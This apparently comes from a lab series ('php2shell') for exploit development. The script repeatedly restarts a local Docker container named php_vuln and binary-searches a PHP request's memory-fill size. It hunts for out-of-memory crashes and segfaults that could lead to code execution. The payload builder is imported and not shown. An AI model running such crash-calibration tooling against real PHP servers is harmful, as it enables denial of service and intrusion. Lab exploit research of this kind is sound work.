#!/usr/bin/env python3
"""php2shell lab, oom17: self-calibrating boot-jitter grinder.

Lesson from oom16 a/b: the fatal band MOVES between Docker VM generations
(oom13 fataled 65200-65250; same band minutes later = survive). Reusable
geometry is the FILL-SHAPE + key run; the rem must be re-found per
generation. Protocol per cycle:
  1. bsearch fill rem edge with the full key run attached (7 sends)
  2. grind rems around the found edge, 12 boots
  3. re-calibrate and repeat, 4 cycles
Stop on key-death fingerprint alloc<=360.
"""
import re
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import build, restart, send, alloc_n

def segfault_lines():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "60"],
                       capture_output=True, text=True)
    txt = r.stdout + r.stderr
    return [l for l in txt.splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def calibrate(log):
    lo, hi = 0, 65512            # hi=fatal edge of the fill-only world (approx)
    while hi - lo > 64:
        mid = (lo + hi) // 2
        restart()
        fatal, text = send(8081, build(mid))
        a = alloc_n(text) if fatal else None
        log(f"  cal rem={mid}: fatal={fatal} alloc={a}")
        if fatal:
            hi = mid
        else:
            lo = mid
    return lo, hi

def main():
    log = lambda *a: print(*a, flush=True)
    hits = 0
    for cycle in range(1, 5):
        log(f"== cycle {cycle}: calibrate ==")
        lo, hi = calibrate(log)
        log(f"cycle {cycle} edge: lo={lo} hi={hi}")
        # grind the edge band
        for rem in range(lo, min(hi + 1, lo + 130), 8):
            restart()
            fatal, text = send(8081, build(rem))
            a = alloc_n(text) if fatal else None
            if fatal:
                log(f"cycle{cycle} rem={rem}: fatal alloc={a}")
                if a is not None and a <= 360:
                    hits += 1
                    log(f"*** KEY DEATH cycle={cycle} rem={rem} alloc={a} ***")
                    time.sleep(2)
                    for h in segfault_lines():
                        log("SEGFAULT:", h)
                    if hits >= 3:
                        log("3 key deaths — done")
                        return
            else:
                log(f"cycle{cycle} rem={rem}: survive")
        log(f"== cycle {cycle} done, hits={hits} ==")
    log(f"grinder finished, hits={hits}")

if __name__ == "__main__":
    main()
